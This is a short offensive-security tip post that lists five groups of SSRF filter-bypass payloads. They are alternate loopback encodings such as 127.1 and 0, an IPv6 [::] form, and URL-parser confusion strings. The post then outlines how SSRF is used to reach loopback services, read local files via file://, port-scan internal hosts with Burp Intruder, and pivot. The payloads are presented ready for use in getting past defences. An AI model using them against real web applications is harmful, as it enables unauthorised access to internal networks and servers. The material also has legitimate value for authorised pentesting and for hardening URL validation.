***

Here are 5 payloads that could be used for bypassing the defenses when it come to SSRF

1) Bypass SSRF with CIDR:
```
http://127.127.127.127
http://127.0.0.1
```
2) Bypass using rare address:
```
http://127.1
http://0
```
3) Bypass using tricks combinations:
```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib : 3.3.3.3
```
4) Bypass again weak parser:
```
http://127.1.1.1:80\@127.2.2.2:80/
```
5) Bypass localhost with `[::]`:
```
http://[::]:80/
http://0000::1:80/
```

Let's remind ourselves what SSRF vulnerabilities are and what can we do with them. In general, SSRF allow us to:
- Access services on loopback interface running on the remote server
- Scan internal network an potentially interact with the discovered services
- Read local files on the server using `file://` protocol handler
- move laterally/pivoting into the internal environment
How to find SSRF? When the target web application allow us to access external resources, e.g. a profile image loaded from external URL (running on a 3rd party website), we can try to load internal resources accessible by the vulnerable web application. For example:
1. We discover that the follow URL works:
	`https://example.com:8000/page?user=&link=https://127.0.0.1:8000`
2. We can then run intruder attack (Burp Suite) trying different ports, effectively doing a port scan of the host
3. We can also try to scan private `IPs` such as `192.168.x.x` and discover alive `IPs` in the internal network